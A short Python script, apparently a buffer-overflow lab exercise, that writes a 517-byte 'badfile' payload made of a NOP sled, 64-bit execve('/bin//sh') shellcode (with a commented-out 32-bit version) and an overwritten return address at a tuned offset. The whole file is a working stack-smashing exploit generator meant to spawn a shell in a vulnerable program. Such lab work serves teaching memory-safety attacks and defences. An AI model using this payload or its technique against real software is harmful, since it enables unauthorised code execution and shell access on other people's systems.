#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"


#    "\x31\xc0"
 #   "\x50"
  #  "\x68""//sh"
   # "\x68""/bin"
  #  "\x89\xe3"
   # "\x50"
   # "\x53"
   # "\x89\xe1"
   # "\x99"  
   # "\xb0\x0b"
   # "\xcd\x80"
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
#ret    = 0xffffcb48 + 120   L1        # Change this number
ret = 0x7fffffffd980 + 304 + 12
#offset = 112    L1          # Change this number 
offset = 308
offset2 = 212
L = 8     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
